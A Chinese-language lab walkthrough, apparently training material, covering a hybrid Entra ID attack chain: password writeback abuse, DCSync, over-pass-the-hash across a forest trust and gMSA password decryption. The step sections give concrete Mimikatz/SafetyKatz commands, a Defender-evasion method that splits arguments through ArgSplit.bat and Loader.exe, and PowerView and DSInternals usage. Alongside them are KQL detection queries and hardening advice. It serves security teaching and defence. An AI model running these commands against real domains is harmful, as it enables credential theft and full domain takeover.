# Learning Objective 9：云到地横向移动、DCSync 与跨森林攻击

> **文档说明**：本文档基于 [AzureAD-Attack-Defense-Playbook](README.md) 项目资料编写，展示了从云端权限到完全控制整个企业基础设施的完整攻击链。

## 目录
- [1. 核心目标](#1-核心目标)
- [2. 理论基础](#2-理论基础)
- [3. 实验环境配置](#3-实验环境配置)
- [4. 实验步骤详解](#4-实验步骤详解)
- [5. 检测与防御](#5-检测与防御)
- [6. 参考资料](#6-参考资料)

---

## 1. 核心目标

本学习目标是整个攻击路径中的高潮部分，展示了极其危险的 **"从云端到本地的横向移动 (Cloud to On-Prem Lateral Movement)"**。攻击者利用云端管理员权限，重置了同步用户的密码，从而获得了本地 Active Directory (AD) 的访问权，进而攻陷整个本地域控森林。

**攻击链概述**：
```
云端User Admin → 密码重置 → 密码回写 → 本地AD访问 → DCSync → 域管哈希 → 跨森林信任 → 完全控制
```

**具体步骤**：
*   **云端突破**：利用 `simulationuser_X` 的 User Administrator 角色，重置同步用户 `hybriduserX` 的密码。
*   **落地内网**：假设密码回写已启用，利用新密码以 `hybriduserX` 的身份登录本地 AD 环境。
*   **DCSync 攻击**：发现 `hybriduserX` 拥有复制目录更改的权限，对 `reservoirone.corp` 域执行 DCSync 攻击，窃取域管理员哈希。
*   **跨森林移动**：利用窃取的管理员哈希，通过森林信任关系，横向移动到另一个森林 `reservoirtwo.corp` 并读取 Flag。
*   **持久化**：破解 gMSA（组托管服务账户）的密码以实现隐蔽持久化。

**学习成果**：完成本实验后，你将理解：
- 云端角色如何影响本地 AD 安全
- 密码回写功能的安全风险
- DCSync 攻击的原理和检测
- 森林信任关系的利用方法
- 企业环境的横向移动技术

---

## 2. 理论基础

### 2.1 密码回写 (Password Writeback) 通道

#### 原理说明

在混合云环境中，Microsoft Entra Connect (原 Azure AD Connect) 允许将云端的密码更改同步回本地 AD。这个功能最初是为了支持自助式密码重置 (SSPR) 和云密码管理而设计的。

**技术架构**：
```
云端 Entra ID → Entra Connect → 密码回写服务 → 本地 AD DC
```

#### 攻击逻辑

如果你在云端是"用户管理员" (User Administrator)，你可以重置云端用户的密码。如果这个用户是"本地同步上来的"，且启用了密码回写，那么你在云端重置的密码会覆盖本地 AD 的密码。

**类比**：
> 你进不去公司大楼（本地 AD），但你控制了公司的钉钉后台（云端）。你在钉钉上把员工门禁卡的密码改了，系统自动把新密码下发到了楼下的闸机。于是，你用新密码刷开了公司大楼的门。

#### 安全风险

相关文档：[AADCSyncServiceAccount.md](AADCSyncServiceAccount.md)

根据项目研究，密码回写存在以下安全风险：

1. **权限放大**：云端的 User Admin 角色可以通过密码重置获得本地 AD 访问权限
2. **同步账户风险**：Entra Connect 服务账户 (On-Premises Directory Synchronization Service Account) 拥有广泛的权限
3. **检测盲区**：密码重置活动可能被误认为是正常的同步活动

#### 权限要求

| 操作 | 所需权限 | Entra ID 内置角色 |
|------|----------|-------------------|
| 重置用户密码 | `microsoft.directory/users/password/update` | User Administrator |
| 启用密码回写 | `microsoft.directory/onPremisesSynchronization/standard/read` | Hybrid Identity Administrator |

#### Microsoft 安全更新

**重要提示**（2024年8月更新）：
根据 [AADCSyncServiceAccount.md](AADCSyncServiceAccount.md) 文档，Microsoft 在 2024 年移除了 Directory Synchronization Accounts 角色的部分高权限：
- 不再拥有应用程序管理权限
- 不再拥有授权策略管理权限
- 不再拥有密码哈希同步设置管理权限

参考：[Entra What's New - August 2024](https://learn.microsoft.com/en-us/entra/fundamentals/whats-new#august-2024)

---

### 2.2 DCSync 攻击

#### 原理说明

DCSync 是 Mimikatz 的一个功能，它模拟域控制器（DC）之间的复制行为。攻击者利用目录复制协议 (DRS-R)，向目标 DC 发送复制请求。

**技术细节**：
```
DRS-R Protocol (Directory Replication Service Remote Protocol)
├── DRSGetNCChanges  // 获取命名上下文更改
├── DRSReplicaSync   // 复制同步请求
└── DRSBind          // 绑定到复制服务
```

#### 权限需求

DCSync 攻击需要以下 Active Directory 权限：
- `DS-Replication-Get-Changes` (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2fcd1)
- `DS-Replication-Get-Changes-All` (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2fcd1)

#### 类比（假传圣旨）

> 你伪装成钦差大臣（兄弟 DC），拿着皇帝的令牌（复制权限），去各省库房（主 DC）调取机密档案。库房管理员看到令牌，不会怀疑你的身份，直接就把所有人的秘密账本交给你了。

#### 检测方法

根据项目中的检测规则，可以使用以下 KQL 查询检测 DCSync 攻击：

```kusto
// 检测目录复制服务的异常调用
SecurityEvent
| where EventID in (4662, 5136, 4624)
| where ObjectName contains "DS-Replication-Get-Changes"
| where SubjectUserName !in~ ("DOMAIN CONTROLLER$", "NT AUTHORITY\\SYSTEM")
```

---

### 2.3 森林信任 (Forest Trust) 与哈希传递 (Pass-the-Hash)

#### 森林信任架构

在多森林环境中，`reservoirone.corp` 和 `reservoirtwo.corp` 之间建立信任关系，允许跨森林的资源访问。

**信任类型**：
- **外部信任**：单向信任，非传递
- **森林信任**：可传递，跨多个域

**信任流向**：
```
Forest A (reservoirone.corp) ←--信任--> Forest B (reservoirtwo.corp)
          ↓                                          ↓
    攻击者获得域管权限                    目标资源 (Flag)
```

#### Over-Pass-the-Hash (OPtH)

Pass-the-Hash 攻击允许攻击者使用 NTLM 哈希而非明文密码进行身份验证。Over-Pass-the-Hash 进一步将哈希转换为 Kerberos 票据。

**技术流程**：
```
1. 获取 NTLM 哈希 (通过 DCSync)
2. 使用 sekurlsa::pth 注入哈希到内存
3. 生成 Kerberos TGT 票据
4. 使用票据访问信任森林的资源
```

---

### 2.4 gMSA (组托管服务账户) 利用

#### gMSA 概述

gMSA 是 Windows Server 引入的服务账户类型，特点包括：
- 自动密码管理（由 AD 自动轮换）
- 支持多主机
- 无需人工干预密码更改

#### 攻击向量

如果获得域控权限，攻击者可以：
1. 获取域控机器账户的哈希
2. 解密 gMSA 密码 Blob
3. 使用 gMSA 进行持久化

**相关参考资料**：[LateralMovementADEID.md](LateralMovementADEID.md)

---

## 3. 实验环境配置

### 3.1 基础架构要求

#### 域控制器配置

| 组件 | 配置要求 |
|------|----------|
| 域名 | `reservoirone.corp` / `reservoirtwo.corp` |
| 操作系统 | Windows Server 2019 或更高版本 |
| 功能级别 | Windows Server 2016 或更高 |
| 森林信任 | 双向信任关系已建立 |

#### Entra Connect 配置

| 配置项 | 状态 | 说明 |
|--------|------|------|
| 密码哈希同步 (PHS) | 启用 | 基础同步功能 |
| 密码回写 | 启用 | 实验必需 |
| Entra Connect 版本 | 2.x 或更高 | 推荐使用最新版本 |

**为什么需要密码回写**：
- 允许云端密码重置同步到本地 AD
- 模拟真实混合云环境
- 演示云到地的攻击路径

### 3.2 用户账户配置

#### 云端账户

| 用户名 | 角色 | 说明 |
|--------|------|------|
| `simulationuser_X` | User Administrator | 用于密码重置 |
| `hybriduserX` | 普通用户（从本地同步） | 攻击目标账户 |

#### 本地账户权限

`hybriduserX` 需要被授予异常的复制权限（这是实验环境的配置错误模拟）：
- `DS-Replication-Get-Changes-In-Filtered-Set`
- 目标：域的根目录

**为什么要配置这个错误**：
真实环境中，可能因以下原因导致普通用户获得复制权限：
1. 权限委派配置错误
2. 组策略应用不当
3. 管理员误操作
4. 第三方软件需求

### 3.3 网络配置

#### 防火墙规则

```
源                    目标                  端口    协议    用途
─────────────────────────────────────────────────────────────
攻击者机器            DC                    445     TCP     SMB
攻击者机器            DC                    389     TCP     LDAP
攻击者机器            DC                    88      TCP     Kerberos
reservoirone DC       reservoirtwo DC       445     TCP     跨森林访问
```

#### DNS 配置

需要配置 DNS 解析支持跨森林访问：
```
reservoirtwo-dc.reservoirtwo.corp → <目标森林DC的IP地址>
```

### 3.4 工具准备

#### 必需工具

| 工具 | 用途 | 文件位置 |
|------|------|----------|
| PowerView | AD 侦察 | `C:\AzAD\Tools\PowerView.ps1` |
| SafetyKatz | 凭证转储 | Mimikatz 变体 |
| ArgSplit.bat | 参数混淆以绕过 Defender | 实验工具 |
| Loader.exe | 加载器 | 实验工具 |
| DSInternals | PowerShell 模块，用于 gMSA | PS Gallery |

#### Defender 绕过配置

实验环境中需要使用参数混淆来绕过 Microsoft Defender：

```cmd
# ArgSplit.bat 将命令拆分为环境变量
ArgSplit.bat
输入: lsadump::dcsync
输出: set "z=c" ... set "Pwn=..."
```

**为什么需要绕过**：
- Microsoft Defender 检测 Mimikatz 的特征码
- 参数混淆可以避免静态检测
- 模拟真实攻击者的规避技术

---

## 4. 实验步骤详解

### 步骤 1：云端重置密码 (Cloud Execution)

#### 背景
在混合云环境中，拥有 User Administrator 角色的账户可以重置任何用户的密码，包括从本地 AD 同步到云端的用户。

#### 操作步骤

1. **身份确认**：使用 `simulationuser_X` 登录 Azure 门户
   - 角色：User Administrator
   - 权限：重置用户密码

2. **定位目标用户**：
   - 搜索 `hybriduserX`
   - 确认该用户为"从本地 AD 同步"（On-premises synchronized）
   - 检查用户属性中的 `On-premises sync enabled` 标记

3. **执行密码重置**：
   - 点击"重置密码"
   - 设置新密码为：`TempSecretX@123`
   - （可选）要求用户在下次登录时更改密码

4. **验证同步**：
   - 等待 2-5 分钟（同步周期）
   - 在本地 AD 验证密码已更新

#### 技术原理

**密码回写流程**：
```
1. Entra ID 接收密码重置请求
2. 验证请求者权限（User Administrator）
3. 通过 Entra Connect 密码回写通道
4. 使用 AD DS Connector Account 写入本地 AD
5. 本地 DC 更新用户密码
```

**检测查询**（参考项目中的 [AADConnectorAccount-AddedTAPorChangedPassword.kql](queries/AADConnectorAccount-AddedTAPorChangedPassword.kql)）：

```kusto
AuditLogs
| where OperationName == "Reset user password"
| where TargetResources[0].userPrincipalName contains "hybriduser"
| project Timestamp, InitiatedBy, OperationName, TargetResources
```

---

### 步骤 2：建立本地会话 (Initial Foothold)

#### 背景
假设攻击者已通过 VPN 或跳板机进入内网网络。

#### 操作步骤

1. **使用 runas 建立新会话**：
   ```cmd
   runas /netonly /user:reservoirone.corp\hybriduserX cmd
   # 输入密码：TempSecretX@123
   ```

   **为什么使用 /netonly**：
   - 只对网络认证使用指定凭据
   - 本地交互继续使用当前用户
   - 避免在本地创建用户配置文件

2. **验证域控连接**：
   ```powershell
   . C:\AzAD\Tools\PowerView.ps1
   Get-DomainComputer -DomainController reservoirone-dc.reservoirone.corp
   ```

3. **检查当前用户权限**：
   ```powershell
   Get-DomainUser -Identity hybriduserX | Select-Object -Property samAccountName, objectsid
   ```

---

### 步骤 3：侦察复制权限 (Privilege Escalation Recon)

#### 背景
在执行 DCSync 攻击之前，需要确认 `hybriduserX` 是否具有复制权限。

#### 操作步骤

1. **检查 ACL 权限**：
   ```powershell
   Get-DomainObjectAcl -SearchBase "DC=reservoirone,DC=corp" -ResolveGUIDs | Where-Object {
       $_.ObjectAceType -match 'replication-get'
   } | Select-Object ObjectDN, ActiveDirectoryRights, IdentityReference
   ```

2. **分析结果**：
   - 如果 `hybriduserX` 出现在结果中
   - 拥有 `DS-Replication-Get-Changes` 或类似权限
   - 这表示存在配置错误（实验环境故意设置）

3. **验证特定权限**：
   ```powershell
   Get-DomainACL -Identity "DC=reservoirone,DC=corp" | Where-Object {
       $_.IdentityReference -match "hybriduser"
   }
   ```

#### 安全含义

真实环境中，普通用户不应拥有复制权限。如果发现此类配置，需要：
1. 立即审查权限委派
2. 移除不必要的复制权限
3. 启用相关的审计和检测规则

---

### 步骤 4：DCSync 窃取域管哈希 (Privilege Escalation)

#### 背景
DCSync 攻击利用目录复制协议，模拟域控制器之间的复制行为来获取所有账户的哈希值。

#### 操作步骤

1. **准备 Mimikatz 参数**（绕过 Defender）：
   ```cmd
   # 1. 生成混淆的参数
   ArgSplit.bat
   输入: lsadump::dcsync /user:Administrator /domain:reservoirone.corp /dc:reservoirone-dc.reservoirone.corp

   # 2. 脚本将生成环境变量
   set "z=c"
   set "i=y"
   ...
   set "Pwn=..."

   # 3. 使用 Loader 执行
   Loader.exe -path SafetyKatz.exe -args "%Pwn%" "exit"
   ```

2. **执行 DCSync**：
   ```cmd
   # 使用混淆后的参数
   Loader.exe -path SafetyKatz.exe -args "%Pwn% /user:Administrator /domain:reservoirone.corp /DC:reservoirone-dc.reservoirone.corp" "exit"
   ```

3. **获取域管哈希**：
   ```
   * SAM Username   : Administrator
   * Domain FQDN    : reservoirone.corp
   * NTLM Hash      : 348bc1xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
   ```

#### 技术原理

**DRS-R 请求流程**：
```
1. DRSBind              - 建立与 DC 的连接
2. DRSGetNCChanges      - 请求命名上下文更改
3. DC 验证权限          - 检查 DS-Replication-Get-Changes 权限
4. 返回账户数据         - 包括 NTLM 哈希
```

**绕过技术说明**：
- `ArgSplit.bat` 将命令拆分为多个环境变量
- 避免 Defender 的静态特征检测
- `Loader.exe` 动态重组命令并执行

#### 检测方法

参考项目文档，DCSync 攻击可以通过以下方式检测：

```kusto
// 检测 DRS-R 调用
SecurityEvent
| where EventID == 4662
| where ObjectServer == "DRS"
| where ObjectType == "domainDNS"
| where OperationType == "Object Access"
| where SubjectUserName !in~ ("DOMAIN CONTROLLER$", "NT AUTHORITY\\ANONYMOUS LOGON")
```

---

### 步骤 5：跨森林横向移动 (Lateral Movement)

#### 背景
现在我们拥有域管理员的 NTLM 哈希，可以利用森林信任关系访问另一个森林。

#### 操作步骤

1. **侦察森林信任**：
   ```powershell
   Get-DomainTrust
   ```

   预期输出：
   ```
   Name                Source           Type     Direction
   ----                ------           ----      ---------
   reservoirtwo.corp   reservoirone     Forest   Bidirectional
   ```

2. **使用 OPtH 创建域管进程**：
   ```cmd
   # 同样使用 ArgSplit 混淆 "sekurlsa::opassth"
   ArgSplit.bat
   输入: sekurlsa::opassth /user:Administrator /domain:reservoirone.corp /ntlm:<Hash> /run:cmd.exe

   # 执行 OPtH
   Loader.exe -path SafetyKatz.exe -args "%Pwn%" "exit"
   ```

3. **访问目标森林资源**：
   ```cmd
   # 在新创建的 CMD 中（已注入域管票据）

   # 方法 1: 使用 WinRS
   winrs -r:reservoirtwo-dc.reservoirtwo.corp powershell

   # 方法 2: 直接访问共享
   dir \\reservoirtwo-dc.reservoirtwo.corp\SharedWithReservoirone

   # 读取 Flag
   type \\reservoirtwo-dc.reservoirtwo.corp\SharedWithReservoirone\flag2.txt
   ```

#### DNS 配置

确保可以解析目标森林的主机名：
```
# 修改本地 hosts 文件
<IP地址> reservoirtwo-dc.reservoirtwo.corp
```

---

### 步骤 6：利用 gMSA 实现持久化 (Persistence - Optional)

#### 背景
gMSA（组托管服务账户）通常被认为很安全，因为密码由 AD 自动管理。但如果我们拿到了域控及其机器账号哈希，就能解密 gMSA 的密码。

#### 操作步骤

1. **获取域控机器账户哈希**（已通过 DCSync 获得）：
   ```
   RESERVOIRONE-DC$ : <NTLM Hash>
   ```

2. **模拟域控机器账户**：
   ```cmd
   # 使用 OPtH 注入机器账户哈希
   sekurlsa::pth /user:RESERVOIRONE-DC$ /domain:reservoirone.corp /ntlm:<Hash> /run:cmd.exe
   ```

3. **获取 gMSA Blob**：
   ```powershell
   # 在注入机器账户的 CMD 中
   $gMSA = Get-ADServiceAccount -Identity pGMSA_f9d2bf93$ -Properties 'msDS-ManagedPassword'
   $blob = $gMSA.'msDS-ManagedPassword'
   ```

4. **解密 gMSA 密码**：
   ```powershell
   Import-Module DSInternals
   $gMSAPassword = ConvertFrom-ADManagedPasswordBlob $blob
   $gMSAPassword.NTLMHash
   ```

5. **持久化**：
   - 使用 gMSA 的哈希进行后续的 DCSync
   - 该账户可能已被赋予 DCSync 权限（常见的同步代理配置）

#### 安全含义

gMSA 账户如果被赋予高权限，会成为：
1. 隐蔽的持久化机制
2. 不易被发现的后门
3. 难以追踪的横向移动路径

---

## 5. 检测与防御

### 5.1 检测策略

#### 云端密码重置检测

参考 [queries/AADConnectorAccount-AddedTAPorChangedPassword.kql](queries/AADConnectorAccount-AddedTAPorChangedPassword.kql)：

```kusto
let AADConnectorAcc = (_GetWatchlist('ServiceAccounts')
    | where ['Tags'] == "Azure AD Connect"
    | project AccountObjectId = ['Service AAD Object Id']);
AuditLogs
  | extend TargetId = tostring(TargetResources[0].id)
  | where TargetId in (AADConnectorAcc)
  | where (LoggedByService == "Authentication Methods"
      and ResultDescription == "Admin registered temporary access pass method for user")
      or OperationName == "Reset user password"
```

#### Entra Connect 配置更改检测

参考 [queries/AADConnect-ChangedDirSyncSettings.kql](queries/AADConnect-ChangedDirSyncSettings.kql)：

```kusto
AuditLogs
| where OperationName has "Set DirSync feature"
| where Category has "DirectoryManagement"
| where parse_json(tostring(TargetResources[0].modifiedProperties))[0].displayName == "DirSyncFeatures"
```

#### 异常 Entra Connect 账户检测

参考 [queries/AADConnectorAccount-OutsideOfWatchList.kql](queries/AADConnectorAccount-OutsideOfWatchList.kql)：

```kusto
let DirSyncRoleAssignedMembers = (IdentityInfo
 | where AssignedRoles contains "Directory Synchronization Accounts"
 | summarize by AccountObjectId, AccountUPN = tolower(AccountUPN));
let WatchList = _GetWatchlist('ServiceAccounts')
    | where ['Tags'] == "Azure AD Connect"
    | project AccountObjectId = ['Service AAD Object Id'];
DirSyncRoleAssignedMembers
| where AccountObjectId !in (WatchList)
```

---

### 5.2 防御建议

#### 立即行动（Phase 1：防止完全沦陷）

根据 [LateralMovementADEID.md](LateralMovementADEID.md) 文档，当 AD 被攻陷时：

1. **禁用 Entra Connect 同步账户**
   ```powershell
   # 禁用所有 On-Premises Directory Synchronization Service Account
   $EIDCAccounts | ForEach-Object {
       Update-MgUser -UserId $_.ObjectId -AccountEnabled:$false
   }
   ```

2. **禁用同步的管理员账户**
   - 找出所有从本地同步的特权账户
   - 立即禁用并撤销会话

3. **配置管理员条件访问策略**
   - 强制 MFA
   - 限制登录频率
   - 要求合规设备

#### 长期防护（Phase 2：保护用户账户）

1. **禁用密码回写**（临时）
   - 防止攻击者将新密码同步回本地 AD

2. **迁移到密码哈希同步**
   - 如果当前使用 PTA 或 ADFS
   - 参考 [迁移指南](https://learn.microsoft.com/en-us/entra/identity/hybrid/plan-migrate-adfs-password-hash-sync)

3. **移除不必要的复制权限**
   - 定期审核 ACL
   - 使用最小权限原则

#### Entra Connect 安全加固

参考 [AADCSyncServiceAccount.md](AADCSyncServiceAccount.md)：

1. **将 Entra Connect 服务器作为 Tier0 资产保护**
   - 限制访问
   - 使用专用管理终端

2. **禁用软匹配和硬匹配**（防止云端账号被接管）
   ```powershell
   Update-MgDirectoryOnPremiseSynchronization
   ```

3. **配置专用公网 IP**
   - 使用条件访问限制 IP

4. **使用应用身份认证 (ABA)** 和 TPM

---

## 6. 参考资料

### 6.1 项目内部文档

| 文档 | 说明 |
|------|------|
| [AADCSyncServiceAccount.md](AADCSyncServiceAccount.md) | Entra Connect 同步服务账户滥用 |
| [EntraSyncAba.md](EntraSyncAba.md) | Entra Connect 应用身份认证 |
| [LateralMovementADEID.md](LateralMovementADEID.md) | AD 到 Entra ID 的横向移动防护 |
| [README.md](README.md) | 项目主文档 |

### 6.2 检测查询文件

| 文件 | 说明 |
|------|------|
| [queries/AADConnectorAccount-AddedTAPorChangedPassword.kql](queries/AADConnectorAccount-AddedTAPorChangedPassword.kql) | 检测同步账户的 TAP 添加或密码重置 |
| [queries/AADConnectorAccount-OutsideOfWatchList.kql](queries/AADConnectorAccount-OutsideOfWatchList.kql) | 检测异常的同步账户活动 |
| [queries/AADConnect-ChangedDirSyncSettings.kql](queries/AADConnect-ChangedDirSyncSettings.kql) | 检测 DirSync 功能配置更改 |
| [queries/AADConnectorAccount-AADActivitiesWithEnrichedInformation.kql](queries/AADConnectorAccount-AADActivitiesWithEnrichedInformation.kql) | 同步账户活动监控 |
| [queries/AADConnect-SignInsOutsideServerIP.kql](queries/AADConnect-SignInsOutsideServerIP.kql) | 检测异常 IP 的同步账户登录 |

### 6.3 PowerShell 脚本

| 文件 | 说明 |
|------|------|
| [scripts/EntraConnectABA/Invoke-EntraConnectAppAuthBackdoor.ps1](scripts/EntraConnectABA/Invoke-EntraConnectAppAuthBackdoor.ps1) | Entra Connect 应用身份认证后门演示 |

### 6.4 官方文档

| 主题 | 链接 |
|------|------|
| 密码回写工作原理 | [How does SSPR writeback work](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-sspr-writeback) |
| DCSync 攻击 | [Mimikatz DCSync Reference](https://adsecurity.org/?page_id=1821) |
| MITRE ATT&CK | [DCSync (T1003.006)](https://attack.mitre.org/techniques/T1003/006/) |
| gMSA 概述 | [Group Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) |
| Entra Connect 同步账户权限 | [Connect accounts and permissions](https://learn.microsoft.com/en-us/entra/identity/hybrid/reference-connect-accounts-permissions) |
| 2024年权限更新 | [What's New - August 2024](https://learn.microsoft.com/en-us/entra/fundamentals/whats-new#august-2024) |

### 6.5 社区资源

| 资源 | 说明 |
|------|------|
| [EntraOps](https://www.cloud-architekt.net/entraops/) | Thomas Naunheim 的 Entra ID 操作工具 |
| [AADInternals](https://aadinternals.com) | Nestori Syynimaa 的 AADInternals PowerShell 模块 |
| [SpecterOps Blog](https://posts.specterops.io) | Entra ID 安全深度分析 |

---

## 附录：MITRE ATT&CK 映射

| 战术 | 技术 | 描述 |
|------|------|------|
| Credential Access | T1003.006 | DCSync |
| Credential Access | T1552.001 | 凭证转储 |
| Lateral Movement | T1550.002 | Pass-the-Hash |
| Privilege Escalation | T1098.001 | 账户操纵 |
| Persistence | T1098.003 | 额外云角色 |
| Defense Evasion | T1027 | 混淆的文件或信息 |

---

**文档版本**：2.0
**最后更新**：2025年1月
**基于项目**：[AzureAD-Attack-Defense-Playbook](https://github.com/Cloud-Architekt/AzureAD-Attack-Defense)
